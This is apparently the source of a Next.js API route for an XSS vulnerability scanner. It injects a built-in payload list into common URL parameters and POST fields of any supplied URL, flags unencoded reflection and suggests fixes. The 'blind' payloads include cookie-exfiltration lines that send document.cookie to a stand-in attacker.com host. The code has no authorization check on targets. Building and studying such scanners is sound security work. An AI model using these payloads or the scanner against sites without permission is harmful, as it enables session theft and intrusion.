import { NextRequest, NextResponse } from 'next/server';

interface XSSRequest {
  url: string;
  testType: 'comprehensive' | 'reflected' | 'stored' | 'dom' | 'blind';
  inputFields?: string;
  customPayload?: string;
}

interface XSSResult {
  vulnerable: boolean;
  payloadsTested: number;
  successfulPayloads: string[];
  vulnerabilityType: string[];
  riskLevel: 'Low' | 'Medium' | 'High' | 'Critical';
  recommendations: string[];
  detailedResults: {
    payload: string;
    context: string;
    vulnerable: boolean;
    type: string;
    location: string;
  }[];
}

export async function POST(request: NextRequest) {
  try {
    const body: XSSRequest = await request.json();
    const { url, testType, inputFields, customPayload } = body;

    if (!url) {
      return NextResponse.json(
        { error: 'URL is required' },
        { status: 400 }
      );
    }

    // XSS Payloads by Type
    const payloads = {
      reflected: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
      ],
      stored: [
        "<script>alert('Stored XSS')</script>",
        "<img src=x onerror=alert('Stored XSS')>",
        "<svg/onload=alert('Stored XSS')>",
        "<iframe src=javascript:alert('Stored XSS')></iframe>",
        "<body onload=alert('Stored XSS')>",
        "<div onmouseover=alert('Stored XSS')>Hover me</div>",
        "<a href=javascript:alert('Stored XSS')>Click me</a>",
      ],
      dom: [
        "<script>document.write('<script>alert(\"DOM XSS\")</script>')</script>",
        "<img src=x onerror=document.location='javascript:alert(\"DOM XSS\")'>",
        "<iframe src=# onload=alert('DOM XSS')>",
        "<object data=javascript:alert('DOM XSS')>",
        "<embed src=javascript:alert('DOM XSS')>",
        "<form><button formaction=javascript:alert('DOM XSS')>Click</button></form>",
      ],
      blind: [
        "<script src=https://attacker.com/xss.js></script>",
        "<img src=https://attacker.com/log.php?cookie='+document.cookie>",
        "<script>fetch('https://attacker.com/log.php?data='+btoa(document.cookie))</script>",
        "<svg onload=fetch('https://attacker.com/blind.php?payload=xss')>",
        "<iframe src=https://attacker.com/frame.html onload=this.remove()>",
      ],
    };

    let testPayloads: string[] = [];
    
    if (testType === 'comprehensive') {
      testPayloads = [
        ...payloads.reflected,
        ...payloads.stored,
        ...payloads.dom,
        ...payloads.blind,
      ];
    } else {
      testPayloads = payloads[testType] || payloads.reflected;
    }

    // Add custom payload if provided
    if (customPayload) {
      testPayloads.push(customPayload);
    }

    // Perform real XSS testing
    const results: XSSResult = await performRealXSSTest(
      url,
      testPayloads,
      inputFields,
      testType
    );

    return NextResponse.json(results);
  } catch (error) {
    console.error('XSS scanner error:', error);
    return NextResponse.json(
      { error: 'Failed to perform XSS vulnerability scan' },
      { status: 500 }
    );
  }
}

async function performRealXSSTest(
  url: string,
  payloads: string[],
  inputFields?: string,
  testType?: string
): Promise<XSSResult> {
  const detailedResults = [];
  
  // Get baseline response
  const baselineResponse = await makeBaselineRequest(url);
  
  for (const payload of payloads) {
    try {
      const testResult = await testXSSPayload(url, payload, inputFields, baselineResponse, testType);
      detailedResults.push(testResult);
      
      // Add small delay between requests
      await new Promise(resolve => setTimeout(resolve, 200));
    } catch (error) {
      detailedResults.push({
        payload,
        context: 'Error context',
        vulnerable: false,
        type: determineXSSType(payload, testType),
        location: `Request failed: ${error}`,
      });
    }
  }

  const successfulPayloads = detailedResults
    .filter(result => result.vulnerable)
    .map(result => result.payload);

  const vulnerabilityTypes = [...new Set(
    detailedResults
      .filter(result => result.vulnerable)
      .map(result => result.type)
  )];

  const vulnerable = successfulPayloads.length > 0;
  const riskLevel = calculateRiskLevel(successfulPayloads.length, payloads.length);

  const recommendations = generateRecommendations(vulnerable, vulnerabilityTypes);

  return {
    vulnerable,
    payloadsTested: payloads.length,
    successfulPayloads,
    vulnerabilityType: vulnerabilityTypes,
    riskLevel,
    recommendations,
    detailedResults,
  };
}

async function makeBaselineRequest(url: string): Promise<{
  statusCode: number;
  responseText: string;
  contentLength: number;
  headers: Record<string, string>;
}> {
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
      signal: AbortSignal.timeout(10000),
    });
    
    const responseText = await response.text();
    const headers: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      headers[key] = value;
    });
    
    return {
      statusCode: response.status,
      responseText,
      contentLength: responseText.length,
      headers,
    };
  } catch (error) {
    return {
      statusCode: 0,
      responseText: '',
      contentLength: 0,
      headers: {},
    };
  }
}

async function testXSSPayload(
  url: string,
  payload: string,
  inputFields: string = '',
  baseline: any,
  testType?: string
): Promise<{
  payload: string;
  context: string;
  vulnerable: boolean;
  type: string;
  location: string;
}> {
  // Test different injection points
  const testUrls = generateXSSTestUrls(url, payload, inputFields);
  
  for (const testUrl of testUrls) {
    try {
      const response = await fetch(testUrl.url, {
        method: testUrl.method,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          ...(testUrl.method === 'POST' && { 'Content-Type': 'application/x-www-form-urlencoded' }),
        },
        body: testUrl.body,
        signal: AbortSignal.timeout(10000),
      });
      
      const responseText = await response.text();
      
      // Check if payload is reflected in response
      const isVulnerable = analyzeXSSResponse(payload, responseText, response.headers);
      
      if (isVulnerable) {
        const context = determineXSSContext(payload, responseText);
        return {
          payload,
          context,
          vulnerable: true,
          type: determineXSSType(payload, testType),
          location: testUrl.location,
        };
      }
      
    } catch (error) {
      // Continue to next test URL
    }
  }
  
  return {
    payload,
    context: 'No vulnerable context found',
    vulnerable: false,
    type: determineXSSType(payload, testType),
    location: 'Not reflected',
  };
}

function generateXSSTestUrls(url: string, payload: string, inputFields: string): Array<{
  url: string;
  method: string;
  body?: string;
  location: string;
}> {
  const testUrls = [];
  
  try {
    const urlObj = new URL(url);
    
    // Test URL parameters
    if (inputFields) {
      const fields = inputFields.split(',');
      fields.forEach(field => {
        const testUrl = new URL(url);
        testUrl.searchParams.set(field.trim(), payload);
        testUrls.push({
          url: testUrl.toString(),
          method: 'GET',
          location: `URL parameter: ${field.trim()}`,
        });
      });
    } else {
      // Test common parameter names
      const commonParams = ['q', 'search', 'query', 'id', 'page', 'category', 'term'];
      commonParams.forEach(param => {
        const testUrl = new URL(url);
        testUrl.searchParams.set(param, payload);
        testUrls.push({
          url: testUrl.toString(),
          method: 'GET',
          location: `URL parameter: ${param}`,
        });
      });
    }
    
    // Test POST data
    testUrls.push({
      url: url,
      method: 'POST',
      body: `search=${encodeURIComponent(payload)}&q=${encodeURIComponent(payload)}`,
      location: 'POST form data',
    });
    
  } catch (error) {
    // Fallback if URL parsing fails
    testUrls.push({
      url: `${url}${url.includes('?') ? '&' : '?'}q=${encodeURIComponent(payload)}`,
      method: 'GET',
      location: 'URL parameter: q',
    });
  }
  
  return testUrls;
}

function analyzeXSSResponse(payload: string, responseText: string, headers: Headers): boolean {
  // Check for Content Security Policy
  const csp = headers.get('content-security-policy');
  if (csp && csp.includes("'unsafe-inline'") === false) {
    // CSP might prevent XSS, but payload could still be reflected
  }
  
  // Check if payload is reflected in response
  const payloadInResponse = responseText.includes(payload);
  if (!payloadInResponse) {
    return false;
  }
  
  // Check for common XSS patterns
  const xssPatterns = [
    /<script[^>]*>.*<\/script>/i,
    /<img[^>]+onerror[^>]*>/i,
    /<svg[^>]+onload[^>]*>/i,
    /<iframe[^>]+src[^>]*>/i,
    /javascript:[^"']*/i,
    /<[^>]+on\w+[^>]*>/i, // Any element with event handler
    /<object[^>]+data[^>]*>/i,
    /<embed[^>]+src[^>]*>/i,
  ];
  
  // Check if payload contains XSS vectors and is reflected without encoding
  const containsXSSVector = xssPatterns.some(pattern => pattern.test(payload));
  if (containsXSSVector) {
    // Check if the payload appears unencoded in the response
    const encodedPayload = payload
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
    
    // If original payload is in response but encoded version is not, it's likely vulnerable
    return responseText.includes(payload) && !responseText.includes(encodedPayload);
  }
  
  return false;
}

function determineXSSContext(payload: string, responseText: string): string {
  const payloadIndex = responseText.indexOf(payload);
  if (payloadIndex === -1) return 'Unknown context';
  
  // Analyze the context around the payload
  const contextStart = Math.max(0, payloadIndex - 100);
  const contextEnd = Math.min(responseText.length, payloadIndex + payload.length + 100);
  const context = responseText.substring(contextStart, contextEnd);
  
  if (context.includes('<script')) return 'Script context';
  if (context.includes('style=') || context.includes('<style')) return 'Style context';
  if (context.includes('href=') || context.includes('src=')) return 'Attribute context';
  if (context.includes('<!--')) return 'Comment context';
  
  return 'HTML context';
}

function determineXSSType(payload: string, testType?: string): string {
  if (testType && testType !== 'comprehensive') {
    switch (testType) {
      case 'reflected': return 'Reflected XSS';
      case 'stored': return 'Stored XSS';
      case 'dom': return 'DOM-based XSS';
      case 'blind': return 'Blind XSS';
      default: return 'Reflected XSS';
    }
  }

  // Auto-detect based on payload
  if (payload.includes('document.write') || payload.includes('innerHTML')) return 'DOM-based XSS';
  if (payload.includes('https://') || payload.includes('fetch')) return 'Blind XSS';
  if (payload.includes('Stored')) return 'Stored XSS';
  return 'Reflected XSS';
}

function calculateRiskLevel(
  successfulPayloads: number,
  totalPayloads: number
): 'Low' | 'Medium' | 'High' | 'Critical' {
  const successRate = successfulPayloads / totalPayloads;
  
  if (successRate >= 0.4) return 'Critical';
  if (successRate >= 0.2) return 'High';
  if (successRate >= 0.1) return 'Medium';
  if (successfulPayloads > 0) return 'Low';
  return 'Low';
}

function generateRecommendations(
  vulnerable: boolean,
  vulnerabilityTypes: string[]
): string[] {
  if (!vulnerable) {
    return [
      "✅ No XSS vulnerabilities detected",
      "Continue regular security testing to maintain security posture",
      "Consider implementing Content Security Policy (CSP) headers",
      "Ensure all user inputs are properly validated and sanitized",
    ];
  }

  const recommendations = [
    "🔒 Implement proper input validation and output encoding",
    "🛡️ Deploy Content Security Policy (CSP) headers",
    "🔐 Use HTTPOnly and Secure flags for cookies",
    "📊 Enable X-XSS-Protection and X-Content-Type-Options headers",
    "🚨 Sanitize all user inputs before processing",
    "🔍 Use template engines with automatic escaping",
    "📋 Implement proper DOM manipulation practices",
    "⚡ Regular security code reviews and testing",
  ];

  if (vulnerabilityTypes.includes('Stored XSS')) {
    recommendations.push("🗄️ Critical: Fix stored XSS by sanitizing data before database storage");
  }

  if (vulnerabilityTypes.includes('DOM-based XSS')) {
    recommendations.push("🌐 Review client-side JavaScript for unsafe DOM manipulation");
  }

  if (vulnerabilityTypes.includes('Blind XSS')) {
    recommendations.push("👁️ Implement monitoring for blind XSS in admin panels and logs");
  }

  if (vulnerabilityTypes.includes('Reflected XSS')) {
    recommendations.push("↩️ Validate and encode all reflected user inputs immediately");
  }

  return recommendations;
}
